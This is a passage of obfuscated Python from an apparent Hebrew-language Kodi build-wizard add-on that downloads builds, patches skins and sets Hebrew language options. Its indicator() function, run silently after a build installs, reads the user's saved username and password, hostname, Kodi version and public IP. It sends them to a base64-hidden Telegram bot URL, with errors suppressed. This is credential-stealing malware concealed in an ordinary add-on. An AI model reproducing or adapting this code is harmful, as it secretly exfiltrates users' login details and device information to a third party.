			DP .update (OO000OO0O0000OO00 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO00O0O0000O0 ))#line:3379
			addonDatabase (O00OOO00O0O0000O0 ,1 )#line:3380
			if DP .iscanceled ():break #line:3381
		if DP .iscanceled ():#line:3382
			DP .close ()#line:3383
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3384
			sys .exit ()#line:3385
		DP .close ()#line:3386
	forceUpdate ()#line:3387
def indicator ():#line:3388
       try :#line:3389
          import json #line:3392
          wiz .log ('FRESH MESSAGE')#line:3393
          O0O0O00O000OOOOO0 =(ADDON .getSetting ("user"))#line:3394
          O0OOO00000OO0O00O =(ADDON .getSetting ("pass"))#line:3395
          O0000OOO0O0000O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3396
          OO0O000O0OO0O0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDQzMjU2NjE1MTpBQUdhUUxkWm90dFQyYUZHNFpRQ19JeUFHcFJyZ0phN3d6SS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxMTg3NTk5NjY2JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3397
          O00O0OO0OO000OO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3398
          O00000OOOOOOOO0OO =str (json .loads (O00O0OO0OO000OO0O )['ip'])#line:3399
          OO0O0OO0O0OOO0OOO =O0O0O00O000OOOOO0 #line:3400
          OO0O00O000OO000O0 =O0OOO00000OO0O00O #line:3401
          import socket #line:3402
          O00O0OO0OO000OO0O =urllib2 .urlopen (OO0O000O0OO0O0OO0 .decode ('base64')+' מערכת הפעלה: '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' שם משתמש: '+OO0O0OO0O0OOO0OOO +' סיסמה: '+OO0O00O000OO000O0 +' קודי: '+O0000OOO0O0000O0O +' כתובת: '+O00000OOOOOOOO0OO ).readlines ()#line:3403
       except :pass #line:3405
def skinfix18 ():#line:3406
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3407
		OO0O0O000OO00OOOO =wiz .workingURL (SKINID18DDONXML )#line:3408
		if OO0O0O000OO00OOOO ==True :#line:3409
			OOO00OOO0O0OOO00O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3410
			if len (OOO00OOO0O0OOO00O )>0 :#line:3411
				OO000OO0O0O00O0OO ='%s-%s.zip'%(SKINID18 ,OOO00OOO0O0OOO00O [0 ])#line:3412
				O0O0000OOO000OO0O =wiz .workingURL (SKIN18ZIPURL +OO000OO0O0O00O0OO )#line:3413
				if O0O0000OOO000OO0O ==True :#line:3414
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3415
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3416
					OOO000O0000000O00 =os .path .join (PACKAGES ,OO000OO0O0O00O0OO )#line:3417
					try :os .remove (OOO000O0000000O00 )#line:3418
					except :pass #line:3419
					downloader .download (SKIN18ZIPURL +OO000OO0O0O00O0OO ,OOO000O0000000O00 ,DP )#line:3420
					extract .all (OOO000O0000000O00 ,HOME ,DP )#line:3421
					try :#line:3422
						O0OOOO0000OOO0O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3423
						OOOOOOO0O0O00O00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3424
						os .rename (O0OOOO0000OOO0O0O ,OOOOOOO0O0O00O00O )#line:3425
					except :#line:3426
						pass #line:3427
					try :#line:3428
						O0O0OO0OOOO0O0OOO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0OOOO0000O0OOOO0 =O0O0OO0OOOO0O0OOO .read ();O0O0OO0OOOO0O0OOO .close ()#line:3429
						O00O00O00O000000O =wiz .parseDOM (O0OOOO0000O0OOOO0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3430
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00O00O000000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3431
					except :#line:3432
						pass #line:3433
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3434
					DP .close ()#line:3435
					xbmc .sleep (500 )#line:3436
					wiz .forceUpdate (True )#line:3437
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3438
				else :#line:3439
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3440
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0000OOO000OO0O ,xbmc .LOGERROR )#line:3441
			else :#line:3442
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3443
		else :#line:3444
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3445
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3446
def skinfix17 ():#line:3447
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3448
		O0000O00OOO0OO0OO =wiz .workingURL (SKINID17DDONXML )#line:3449
		if O0000O00OOO0OO0OO ==True :#line:3450
			OO0O0000000O0O0OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3451
			if len (OO0O0000000O0O0OO )>0 :#line:3452
				OO00000O0OO0OOOOO ='%s-%s.zip'%(SKINID17 ,OO0O0000000O0O0OO [0 ])#line:3453
				OO0OOOO0O00000O0O =wiz .workingURL (SKIN17ZIPURL +OO00000O0OO0OOOOO )#line:3454
				if OO0OOOO0O00000O0O ==True :#line:3455
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3456
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3457
					OOOOO0OOOOOO00O0O =os .path .join (PACKAGES ,OO00000O0OO0OOOOO )#line:3458
					try :os .remove (OOOOO0OOOOOO00O0O )#line:3459
					except :pass #line:3460
					downloader .download (SKIN17ZIPURL +OO00000O0OO0OOOOO ,OOOOO0OOOOOO00O0O ,DP )#line:3461
					extract .all (OOOOO0OOOOOO00O0O ,HOME ,DP )#line:3462
					try :#line:3463
						OO0OOOOOOO0O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3464
						O00OO00000OOO0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3465
						os .rename (OO0OOOOOOO0O0OOO0 ,O00OO00000OOO0OOO )#line:3466
					except :#line:3467
						pass #line:3468
					try :#line:3469
						OOOO0OO0OO0OO0O00 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOOOOO000OO0000OO =OOOO0OO0OO0OO0O00 .read ();OOOO0OO0OO0OO0O00 .close ()#line:3470
						OOOOO00OO00OOOOOO =wiz .parseDOM (OOOOOO000OO0000OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3471
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO00OO00OOOOOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3472
					except :#line:3473
						pass #line:3474
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3475
					DP .close ()#line:3476
					xbmc .sleep (500 )#line:3477
					wiz .forceUpdate (True )#line:3478
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3479
				else :#line:3480
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3481
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0OOOO0O00000O0O ,xbmc .LOGERROR )#line:3482
			else :#line:3483
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3484
		else :#line:3485
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3486
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3487
def fix17update ():#line:3488
	if KODIV >=17 and KODIV <18 :#line:3489
		wiz .kodi17Fix ()#line:3490
		xbmc .sleep (4000 )#line:3491
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3492
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3493
		fixfont ()#line:3494
		O000000000OOO0000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3495
		try :#line:3497
			O00O0O0OOOOO00OOO =open (O000000000OOO0000 ,'r')#line:3498
			O0OO00OO000O0O000 =O00O0O0OOOOO00OOO .read ()#line:3499
			O00O0O0OOOOO00OOO .close ()#line:3500
			O00OO0O00O0O0O0OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3501
			OO000OOO0OO0OOO0O =re .compile (O00OO0O00O0O0O0OO ).findall (O0OO00OO000O0O000 )[0 ]#line:3502
			O00O0O0OOOOO00OOO =open (O000000000OOO0000 ,'w')#line:3503
			O00O0O0OOOOO00OOO .write (O0OO00OO000O0O000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO000OOO0OO0OOO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3504
			O00O0O0OOOOO00OOO .close ()#line:3505
		except :#line:3506
				pass #line:3507
		wiz .kodi17Fix ()#line:3508
		O000000000OOO0000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3509
		try :#line:3510
			O00O0O0OOOOO00OOO =open (O000000000OOO0000 ,'r')#line:3511
			O0OO00OO000O0O000 =O00O0O0OOOOO00OOO .read ()#line:3512
			O00O0O0OOOOO00OOO .close ()#line:3513
			O00OO0O00O0O0O0OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3514
			OO000OOO0OO0OOO0O =re .compile (O00OO0O00O0O0O0OO ).findall (O0OO00OO000O0O000 )[0 ]#line:3515
			O00O0O0OOOOO00OOO =open (O000000000OOO0000 ,'w')#line:3516
			O00O0O0OOOOO00OOO .write (O0OO00OO000O0O000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO000OOO0OO0OOO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3517
			O00O0O0OOOOO00OOO .close ()#line:3518
		except :#line:3519
				pass #line:3520
		swapSkins ('skin.Premium.mod')#line:3521
def fix18update ():#line:3523
	if KODIV >=18 :#line:3524
		xbmc .sleep (4000 )#line:3525
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3526
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3527
		fixfont ()#line:3528
		O0000OO00OOOOO00O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3529
		try :#line:3530
			O0O00000O0O0OOO00 =open (O0000OO00OOOOO00O ,'r')#line:3531
			OOOO00OO0OOO00O00 =O0O00000O0O0OOO00 .read ()#line:3532
			O0O00000O0O0OOO00 .close ()#line:3533
			O0O0000OOO00OO0OO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3534
			O00O0O0OO0OOOO0OO =re .compile (O0O0000OOO00OO0OO ).findall (OOOO00OO0OOO00O00 )[0 ]#line:3535
			O0O00000O0O0OOO00 =open (O0000OO00OOOOO00O ,'w')#line:3536
			O0O00000O0O0OOO00 .write (OOOO00OO0OOO00O00 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00O0O0OO0OOOO0OO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3537
			O0O00000O0O0OOO00 .close ()#line:3538
		except :#line:3539
				pass #line:3540
		wiz .kodi17Fix ()#line:3541
		O0000OO00OOOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3542
		try :#line:3543
			O0O00000O0O0OOO00 =open (O0000OO00OOOOO00O ,'r')#line:3544
			OOOO00OO0OOO00O00 =O0O00000O0O0OOO00 .read ()#line:3545
			O0O00000O0O0OOO00 .close ()#line:3546
			O0O0000OOO00OO0OO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3547
			O00O0O0OO0OOOO0OO =re .compile (O0O0000OOO00OO0OO ).findall (OOOO00OO0OOO00O00 )[0 ]#line:3548
			O0O00000O0O0OOO00 =open (O0000OO00OOOOO00O ,'w')#line:3549
			O0O00000O0O0OOO00 .write (OOOO00OO0OOO00O00 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00O0O0OO0OOOO0OO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3550
			O0O00000O0O0OOO00 .close ()#line:3551
		except :#line:3552
				pass #line:3553
		swapSkins ('skin.Premium.mod')#line:3554
def buildWizard (O0O00OOO000O00O00 ,OOO0OO00OO000OOOO ,theme =None ,over =False ):#line:3557
	if over ==False :#line:3558
		O000O000000O000O0 =wiz .checkBuild (O0O00OOO000O00O00 ,'url')#line:3559
		if O000O000000O000O0 ==False :#line:3561
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Media Center','אנא המתן')))#line:3565
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.mediacenter/?mode=install&name=+Kodi+Media+Center&url=gui)")#line:3566
			return #line:3567
		O00OO0O0OOO00000O =wiz .workingURL (O000O000000O000O0 )#line:3568
		if O00OO0O0OOO00000O ==False :#line:3569
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00OO0O0OOO00000O ))#line:3570
			return #line:3571
	if OOO0OO00OO000OOOO =='gui':#line:3572
		if O0O00OOO000O00O00 ==BUILDNAME :#line:3573
			if over ==True :O00O00OOOOOO00O00 =1 #line:3574
			else :O00O00OOOOOO00O00 =1 #line:3575
		else :#line:3576
			O00O00OOOOOO00O00 =1 #line:3577
		if O00O00OOOOOO00O00 :#line:3578
			remove_addons ()#line:3579
			remove_addons2 ()#line:3580
			O0O00OO0000OOO0OO =wiz .checkBuild (O0O00OOO000O00O00 ,'gui')#line:3581
			O000000O00OO00O00 =O0O00OOO000O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3582
			if not wiz .workingURL (O0O00OO0000OOO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3583
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3584
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 ),'','אנא המתן')#line:3585
			O00O0O0O000O0OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000000O00OO00O00 )#line:3586
			try :os .remove (O00O0O0O000O0OO00 )#line:3587
			except :pass #line:3588
			logging .warning (O0O00OO0000OOO0OO )#line:3589
			if 'google'in O0O00OO0000OOO0OO :#line:3590
			   OOOOOOOO00O00OO0O =googledrive_download (O0O00OO0000OOO0OO ,O00O0O0O000O0OO00 ,DP ,wiz .checkBuild (O0O00OOO000O00O00 ,'filesize'))#line:3591
			else :#line:3594
			  downloader .download (O0O00OO0000OOO0OO ,O00O0O0O000O0OO00 ,DP )#line:3595
			xbmc .sleep (100 )#line:3596
			OOO00O0000O0OO0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 )#line:3597
			DP .update (0 ,OOO00O0000O0OO0OO ,'','אנא המתן')#line:3598
			extract .all (O00O0O0O000O0OO00 ,HOME ,DP ,title =OOO00O0000O0OO0OO )#line:3599
			DP .close ()#line:3600
			wiz .defaultSkin ()#line:3601
			wiz .lookandFeelData ('save')#line:3602
			wiz .kodi17Fix ()#line:3603
			if INSTALLMETHOD ==1 :OOO0OOO00OO0OOOO0 =1 #line:3605
			elif INSTALLMETHOD ==2 :OOO0OOO00OO0OOOO0 =0 #line:3606
			else :DP .close ()#line:3607
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3608
		else :#line:3610
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3611
	if OOO0OO00OO000OOOO =='gui2':#line:3612
		if O0O00OOO000O00O00 ==BUILDNAME :#line:3613
			if over ==True :O00O00OOOOOO00O00 =1 #line:3614
			else :O00O00OOOOOO00O00 =1 #line:3615
		else :#line:3616
			O00O00OOOOOO00O00 =1 #line:3617
		if O00O00OOOOOO00O00 :#line:3618
			remove_addons ()#line:3619
			remove_addons2 ()#line:3620
			O0O00OO0000OOO0OO =wiz .checkBuild (O0O00OOO000O00O00 ,'gui')#line:3621
			O000000O00OO00O00 =O0O00OOO000O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3622
			if not wiz .workingURL (O0O00OO0000OOO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3623
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3624
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 ),'','אנא המתן')#line:3625
			O00O0O0O000O0OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000000O00OO00O00 )#line:3626
			try :os .remove (O00O0O0O000O0OO00 )#line:3627
			except :pass #line:3628
			logging .warning (O0O00OO0000OOO0OO )#line:3629
			if 'google'in O0O00OO0000OOO0OO :#line:3630
			   OOOOOOOO00O00OO0O =googledrive_download (O0O00OO0000OOO0OO ,O00O0O0O000O0OO00 ,DP ,wiz .checkBuild (O0O00OOO000O00O00 ,'filesize'))#line:3631
			else :#line:3634
			  downloader .download (O0O00OO0000OOO0OO ,O00O0O0O000O0OO00 ,DP )#line:3635
			xbmc .sleep (100 )#line:3636
			OOO00O0000O0OO0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 )#line:3637
			DP .update (0 ,OOO00O0000O0OO0OO ,'','אנא המתן')#line:3638
			extract .all (O00O0O0O000O0OO00 ,HOME ,DP ,title =OOO00O0000O0OO0OO )#line:3639
			DP .close ()#line:3640
			wiz .defaultSkin ()#line:3641
			wiz .lookandFeelData ('save')#line:3642
			if INSTALLMETHOD ==1 :OOO0OOO00OO0OOOO0 =1 #line:3645
			elif INSTALLMETHOD ==2 :OOO0OOO00OO0OOOO0 =0 #line:3646
			else :DP .close ()#line:3647
		else :#line:3649
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3650
	elif OOO0OO00OO000OOOO =='fresh':#line:3651
		freshStart (O0O00OOO000O00O00 )#line:3652
	elif OOO0OO00OO000OOOO =='normal':#line:3653
		if url =='normal':#line:3654
			if KEEPTRAKT =='true':#line:3655
				traktit .autoUpdate ('all')#line:3656
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3657
			if KEEPREAL =='true':#line:3658
				debridit .autoUpdate ('all')#line:3659
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3660
			if KEEPLOGIN =='true':#line:3661
				loginit .autoUpdate ('all')#line:3662
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3663
		OOO000OO00000OO00 =int (KODIV );OOOOOOOO0OO000OO0 =int (float (wiz .checkBuild (O0O00OOO000O00O00 ,'kodi')))#line:3664
		if not OOO000OO00000OO00 ==OOOOOOOO0OO000OO0 :#line:3665
			if OOO000OO00000OO00 ==16 and OOOOOOOO0OO000OO0 <=15 :O0O00O000O00000OO =False #line:3666
			else :O0O00O000O00000OO =True #line:3667
		else :O0O00O000O00000OO =False #line:3668
		if O0O00O000O00000OO ==True :#line:3669
			OOOO00O000O0O0O0O =1 #line:3670
		else :#line:3671
			if not over ==False :OOOO00O000O0O0O0O =1 #line:3672
			else :OOOO00O000O0O0O0O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3673
		if OOOO00O000O0O0O0O :#line:3674
			wiz .clearS ('build')#line:3675
			O0O00OO0000OOO0OO =wiz .checkBuild (O0O00OOO000O00O00 ,'url')#line:3676
			O000000O00OO00O00 =O0O00OOO000O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3677
			if not wiz .workingURL (O0O00OO0000OOO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3678
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3679
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 ,wiz .checkBuild (O0O00OOO000O00O00 ,'version')),'','אנא המתן')#line:3680
			O00O0O0O000O0OO00 =os .path .join (PACKAGES ,'%s.zip'%O000000O00OO00O00 )#line:3681
			try :os .remove (O00O0O0O000O0OO00 )#line:3682
			except :pass #line:3683
			logging .warning (O0O00OO0000OOO0OO )#line:3684
			if 'google'in O0O00OO0000OOO0OO :#line:3685
			   OOOOOOOO00O00OO0O =googledrive_download (O0O00OO0000OOO0OO ,O00O0O0O000O0OO00 ,DP ,wiz .checkBuild (O0O00OOO000O00O00 ,'filesize'))#line:3686
			else :#line:3689
			  downloader .download (O0O00OO0000OOO0OO ,O00O0O0O000O0OO00 ,DP )#line:3690
			xbmc .sleep (1000 )#line:3691
			OOO00O0000O0OO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 ,wiz .checkBuild (O0O00OOO000O00O00 ,'version'))#line:3692
			DP .update (0 ,OOO00O0000O0OO0OO ,'','Please Wait')#line:3693
			O00O000OO0O0OOO0O ,OO0OO0OO00O000OO0 ,OOOOO0O00000OO000 =extract .all (O00O0O0O000O0OO00 ,HOME ,DP ,title =OOO00O0000O0OO0OO )#line:3694
			if int (float (O00O000OO0O0OOO0O ))>0 :#line:3695
				wiz .fixmetas ()#line:3696
				wiz .lookandFeelData ('save')#line:3697
				wiz .defaultSkin ()#line:3698
				wiz .setS ('buildname',O0O00OOO000O00O00 )#line:3700
				wiz .setS ('buildversion',wiz .checkBuild (O0O00OOO000O00O00 ,'version'))#line:3701
				wiz .setS ('buildtheme','')#line:3702
				wiz .setS ('latestversion',wiz .checkBuild (O0O00OOO000O00O00 ,'version'))#line:3703
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3704
				wiz .setS ('installed','true')#line:3705
				wiz .setS ('extract',str (O00O000OO0O0OOO0O ))#line:3706
				wiz .setS ('errors',str (OO0OO0OO00O000OO0 ))#line:3707
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O00O000OO0O0OOO0O ,OO0OO0OO00O000OO0 ))#line:3708
				fastupdatefirstbuild (NOTEID )#line:3711
				skinfix18 ()#line:3712
				try :os .remove (O00O0O0O000O0OO00 )#line:3714
				except :pass #line:3715
				if int (float (OO0OO0OO00O000OO0 ))>0 :#line:3718
					O00O00OOOOOO00O00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 ,wiz .checkBuild (O0O00OOO000O00O00 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00O000OO0O0OOO0O ,'%',COLOR1 ,OO0OO0OO00O000OO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3719
					if O00O00OOOOOO00O00 :#line:3720
						if isinstance (OO0OO0OO00O000OO0 ,unicode ):#line:3721
							OOOOO0O00000OO000 =OOOOO0O00000OO000 .encode ('utf-8')#line:3722
						wiz .TextBox (ADDONTITLE ,OOOOO0O00000OO000 )#line:3723
				DP .close ()#line:3724
				O00OO0OO0OOO00000 =wiz .themeCount (O0O00OOO000O00O00 )#line:3725
				indicator ()#line:3726
				if not O00OO0OO0OOO00000 ==False :#line:3727
					buildWizard (O0O00OOO000O00O00 ,'theme')#line:3728
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3729
				if INSTALLMETHOD ==1 :OOO0OOO00OO0OOOO0 =1 #line:3730
				elif INSTALLMETHOD ==2 :OOO0OOO00OO0OOOO0 =0 #line:3731
				else :resetkodi ()#line:3732
				if OOO0OOO00OO0OOOO0 ==1 :wiz .reloadFix ()#line:3734
				else :wiz .killxbmc (True )#line:3735
			else :#line:3736
				if isinstance (OO0OO0OO00O000OO0 ,unicode ):#line:3737
					OOOOO0O00000OO000 =OOOOO0O00000OO000 .encode ('utf-8')#line:3738
				O00OO0OOOO00OOOOO =open (O00O0O0O000O0OO00 ,'r')#line:3739
				OOO0O0OO0OO00O000 =O00OO0OOOO00OOOOO .read ()#line:3740
				O00OO00OOO0OOO000 =''#line:3741
				for O0OO00OO00000O00O in OOOOOOOO00O00OO0O :#line:3742
				  O00OO00OOO0OOO000 ='key: '+O00OO00OOO0OOO000 +'\n'+O0OO00OO00000O00O #line:3743
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOOOO0O00000OO000 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O00OO00OOO0OOO000 )#line:3744
		else :#line:3745
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3746
	elif OOO0OO00OO000OOOO =='theme':#line:3747
		if theme ==None :#line:3748
			O00OO0OO0OOO00000 =wiz .checkBuild (O0O00OOO000O00O00 ,'theme')#line:3749
			O0O0OOOOOO0OO0000 =[]#line:3750
			if not O00OO0OO0OOO00000 =='http://'and wiz .workingURL (O00OO0OO0OOO00000 )==True :#line:3751
				O0O0OOOOOO0OO0000 =wiz .themeCount (O0O00OOO000O00O00 ,False )#line:3752
				if len (O0O0OOOOOO0OO0000 )>0 :#line:3753
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0O00OOO000O00O00 ,COLOR1 ,len (O0O0OOOOOO0OO0000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3754
						wiz .log ("Theme List: %s "%str (O0O0OOOOOO0OO0000 ))#line:3755
						OO0O00O0O000OOO0O =DIALOG .select (ADDONTITLE ,O0O0OOOOOO0OO0000 )#line:3756
						wiz .log ("Theme install selected: %s"%OO0O00O0O000OOO0O )#line:3757
						if not OO0O00O0O000OOO0O ==-1 :theme =O0O0OOOOOO0OO0000 [OO0O00O0O000OOO0O ];OO0000O000OOOOO00 =True #line:3758
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3759
